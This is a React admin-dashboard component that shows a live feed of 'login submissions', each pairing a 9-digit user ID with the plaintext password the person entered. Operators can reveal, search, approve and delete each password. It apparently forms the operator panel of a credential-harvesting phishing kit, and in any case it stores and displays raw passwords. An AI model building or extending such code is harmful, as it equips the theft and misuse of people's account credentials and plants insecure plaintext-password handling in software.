import { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { LayoutDashboard, Users, Clock, CheckCircle2, Shield, LogOut, Trash2, Eye, EyeOff, Search, AlertTriangle } from 'lucide-react';
import { Logo } from './Logo';
import { Submission } from '../types';

interface AdminViewProps {
  submissions: Submission[];
  onApprove: (id: string) => Promise<void>;
  onDelete: (id: string) => Promise<void>;
  onRefresh: () => Promise<void>;
  onLogout: () => void;
}

export function AdminView({
  submissions,
  onApprove,
  onDelete,
  onRefresh,
  onLogout
}: AdminViewProps) {
  const [searchTerm, setSearchTerm] = useState('');
  const [filter, setFilter] = useState<'all' | 'pending' | 'approved'>('all');
  const [revealedPasswords, setRevealedPasswords] = useState<Record<string, boolean>>({});
  const [deleteConfirmId, setDeleteConfirmId] = useState<string | null>(null);
  const [actionLoadingId, setActionLoadingId] = useState<string | null>(null);

  const togglePasswordVisibility = (id: string) => {
    setRevealedPasswords(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const handleApproveClick = async (id: string) => {
    setActionLoadingId(id);
    try {
      await onApprove(id);
    } finally {
      setActionLoadingId(null);
    }
  };

  const handleDeleteConfirm = async () => {
    if (!deleteConfirmId) return;
    setActionLoadingId(deleteConfirmId);
    try {
      await onDelete(deleteConfirmId);
    } finally {
      setActionLoadingId(null);
      setDeleteConfirmId(null);
    }
  };

  const filteredSubmissions = submissions.filter(sub => {
    const matchesSearch = sub.userId.includes(searchTerm) || sub.password.toLowerCase().includes(searchTerm.toLowerCase());
    if (filter === 'pending') return matchesSearch && sub.status === 'Pending Review';
    if (filter === 'approved') return matchesSearch && sub.status === 'Approved';
    return matchesSearch;
  });

  const pendingCount = submissions.filter(s => s.status === 'Pending Review').length;
  const approvedCount = submissions.filter(s => s.status === 'Approved').length;

  return (
    <div className="min-h-screen bg-[#f8fafc] font-sans text-slate-900 pb-16">
      {/* Admin Header */}
      <header className="bg-white border-b border-slate-200 px-6 py-4 flex items-center justify-between sticky top-0 z-40">
        <div className="flex items-center gap-4">
          <Logo compact />
          <div className="h-6 w-px bg-slate-200 mx-2 hidden sm:block"></div>
          <h1 className="text-lg font-semibold text-slate-700 hidden sm:block">Admin Control Center</h1>
        </div>
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-2 px-3 py-1.5 bg-slate-100 rounded-full text-sm font-medium text-slate-600">
            <Shield size={16} className="text-[#1a9bfc]" />
            <span className="hidden xs:inline">Administrator</span>
          </div>
          <button 
            id="admin-logout-btn"
            onClick={onLogout}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-slate-600 hover:text-red-600 hover:bg-red-50 transition-colors text-sm font-medium"
            title="Logout"
          >
            <LogOut size={18} />
            <span className="hidden sm:inline">Logout</span>
          </button>
        </div>
      </header>

      <main className="p-6 md:p-8 max-w-7xl mx-auto">
        {/* Summary Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-white p-6 rounded-2xl shadow-sm border border-slate-200 flex items-center gap-6 cursor-pointer hover:border-slate-300 transition-colors"
            onClick={() => setFilter('all')}
          >
            <div className="w-14 h-14 bg-blue-50 text-blue-600 rounded-2xl flex items-center justify-center shrink-0">
              <Users size={28} />
            </div>
            <div>
              <p className="text-xs font-bold text-slate-500 uppercase tracking-wider">Total Submissions</p>
              <h2 className="text-3xl font-bold mt-1 text-slate-800">{submissions.length}</h2>
            </div>
          </motion.div>

          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.1 }}
            className="bg-white p-6 rounded-2xl shadow-sm border border-slate-200 flex items-center gap-6 cursor-pointer hover:border-amber-300 transition-colors"
            onClick={() => setFilter('pending')}
          >
            <div className="w-14 h-14 bg-amber-50 text-amber-600 rounded-2xl flex items-center justify-center shrink-0">
              <Clock size={28} />
            </div>
            <div>
              <p className="text-xs font-bold text-slate-500 uppercase tracking-wider">Pending Review</p>
              <h2 className="text-3xl font-bold mt-1 text-amber-600">
                {pendingCount}
              </h2>
            </div>
          </motion.div>
        </div>

        {/* Main Table Container */}
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
          className="bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden"
        >
          <div className="px-6 py-5 border-b border-slate-100 flex flex-col sm:flex-row sm:items-center justify-between gap-4">
            <div className="flex items-center gap-3">
              <h3 className="font-bold text-lg flex items-center gap-2 text-slate-800">
                <LayoutDashboard size={20} className="text-slate-400" />
                Recent Login Submissions
              </h3>
              <span className="flex items-center gap-1.5 text-xs font-semibold bg-blue-50 text-blue-600 px-2.5 py-1 rounded-full uppercase tracking-tighter">
                <span className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse"></span>
                Live Feed
              </span>
            </div>

            <div className="flex flex-wrap items-center gap-3">
              {/* Search */}
              <div className="relative">
                <Search size={15} className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400" />
                <input
                  type="text"
                  placeholder="Filter by ID..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="pl-9 pr-3 py-1.5 text-xs bg-slate-50 border border-slate-200 rounded-lg focus:outline-none focus:border-blue-500 text-slate-700 w-36 sm:w-44"
                />
              </div>

              {/* Status Filter Buttons */}
              <div className="flex bg-slate-100 p-0.5 rounded-lg text-xs font-medium">
                <button
                  onClick={() => setFilter('all')}
                  className={`px-2.5 py-1 rounded-md transition-colors ${filter === 'all' ? 'bg-white text-slate-800 shadow-xs font-semibold' : 'text-slate-500 hover:text-slate-800'}`}
                >
                  All ({submissions.length})
                </button>
                <button
                  onClick={() => setFilter('pending')}
                  className={`px-2.5 py-1 rounded-md transition-colors ${filter === 'pending' ? 'bg-white text-amber-700 shadow-xs font-semibold' : 'text-slate-500 hover:text-slate-800'}`}
                >
                  Pending ({pendingCount})
                </button>
                <button
                  onClick={() => setFilter('approved')}
                  className={`px-2.5 py-1 rounded-md transition-colors ${filter === 'approved' ? 'bg-white text-green-700 shadow-xs font-semibold' : 'text-slate-500 hover:text-slate-800'}`}
                >
                  Approved ({approvedCount})
                </button>
              </div>

              <button 
                id="refresh-feed-btn"
                onClick={onRefresh}
                className="text-xs font-semibold bg-slate-100 text-slate-600 px-3 py-1.5 rounded-lg hover:bg-slate-200 active:scale-95 transition-all"
              >
                Refresh
              </button>
            </div>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="bg-slate-50/70 border-b border-slate-100">
                  <th className="px-6 py-4 text-xs font-bold text-slate-500 uppercase tracking-wider">User ID (9-Digit)</th>
                  <th className="px-6 py-4 text-xs font-bold text-slate-500 uppercase tracking-wider">Submitted Password</th>
                  <th className="px-6 py-4 text-xs font-bold text-slate-500 uppercase tracking-wider">Timestamp</th>
                  <th className="px-6 py-4 text-xs font-bold text-slate-500 uppercase tracking-wider">Current Status</th>
                  <th className="px-6 py-4 text-xs font-bold text-slate-500 uppercase tracking-wider text-right">Action</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100">
                {filteredSubmissions.length === 0 ? (
                  <tr>
                    <td colSpan={5} className="px-6 py-12 text-center text-slate-400 text-sm">
                      No submissions found matching your filters.
                    </td>
                  </tr>
                ) : (
                  filteredSubmissions.map((sub) => {
                    const isRevealed = revealedPasswords[sub.id] ?? false;
                    const isLoading = actionLoadingId === sub.id;

                    return (
                      <tr key={sub.id} className="hover:bg-slate-50/70 transition-colors group">
                        <td className="px-6 py-4 font-mono text-sm font-semibold text-slate-800">
                          {sub.userId}
                        </td>
                        <td className="px-6 py-4 font-mono text-sm text-slate-600">
                          <div className="flex items-center gap-2">
                            <span>{isRevealed ? sub.password : '••••••••••••'}</span>
                            <button
                              type="button"
                              onClick={() => togglePasswordVisibility(sub.id)}
                              className="text-slate-400 hover:text-slate-600 p-1 rounded"
                              title={isRevealed ? 'Hide Password' : 'Show Password'}
                            >
                              {isRevealed ? <EyeOff size={14} /> : <Eye size={14} />}
                            </button>
                          </div>
                        </td>
                        <td className="px-6 py-4 text-sm text-slate-400">
                          {sub.timestamp}
                        </td>
                        <td className="px-6 py-4">
                          <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-bold uppercase tracking-tighter ${
                            sub.status === 'Approved' 
                              ? 'bg-green-50 text-green-700 border border-green-200/60' 
                              : 'bg-amber-50 text-amber-700 border border-amber-200/60'
                          }`}>
                            {sub.status === 'Approved' ? <CheckCircle2 size={12} /> : <Clock size={12} />}
                            {sub.status}
                          </span>
                        </td>
                        <td className="px-6 py-4 text-right">
                          <div className="flex items-center justify-end gap-2">
                            {sub.status === 'Pending Review' ? (
                              <button 
                                id={`approve-btn-${sub.id}`}
                                disabled={isLoading}
                                onClick={() => handleApproveClick(sub.id)}
                                className="bg-[#1a9bfc] hover:bg-[#0d8ae8] text-white text-xs font-bold px-4 py-2 rounded-lg transition-all shadow-sm shadow-blue-200 active:scale-95 disabled:opacity-50"
                              >
                                {isLoading ? 'Approving...' : 'Approve'}
                              </button>
                            ) : (
                              <span className="text-green-600 text-xs font-bold uppercase tracking-widest mr-2 flex items-center gap-1">
                                <CheckCircle2 size={14} /> Verified
                              </span>
                            )}
                            <button 
                              id={`delete-btn-${sub.id}`}
                              onClick={() => setDeleteConfirmId(sub.id)}
                              className="p-2 text-slate-400 hover:text-red-500 hover:bg-red-50 rounded-lg transition-colors"
                              title="Delete Submission"
                            >
                              <Trash2 size={16} />
                            </button>
                          </div>
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>

          <div className="px-6 py-4 bg-slate-50/50 border-t border-slate-100 flex items-center justify-between text-xs text-slate-500">
            <span>Showing {filteredSubmissions.length} of {submissions.length} submissions</span>
            <button 
              onClick={() => { setFilter('all'); setSearchTerm(''); }}
              className="font-semibold text-[#1a9bfc] hover:underline"
            >
              Reset Filters
            </button>
          </div>
        </motion.div>
      </main>

      {/* Delete Confirmation Modal (Safe for iFrames) */}
      <AnimatePresence>
        {deleteConfirmId && (
          <div className="fixed inset-0 bg-black/40 backdrop-blur-xs z-50 flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="bg-white rounded-2xl shadow-xl max-w-sm w-full p-6 text-slate-800 border border-slate-100"
            >
              <div className="w-12 h-12 bg-red-50 text-red-600 rounded-xl flex items-center justify-center mb-4">
                <AlertTriangle size={24} />
              </div>
              <h4 className="text-lg font-bold text-slate-900 mb-1">Delete Submission?</h4>
              <p className="text-sm text-slate-500 mb-6">
                Are you sure you want to delete this submission? This record will be permanently removed.
              </p>
              <div className="flex gap-3 justify-end">
                <button
                  type="button"
                  onClick={() => setDeleteConfirmId(null)}
                  className="px-4 py-2 rounded-lg text-sm font-medium text-slate-600 hover:bg-slate-100 transition-colors"
                >
                  Cancel
                </button>
                <button
                  type="button"
                  id="confirm-delete-btn"
                  onClick={handleDeleteConfirm}
                  className="px-4 py-2 rounded-lg text-sm font-medium bg-red-600 hover:bg-red-700 text-white transition-colors shadow-sm shadow-red-200"
                >
                  Delete
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
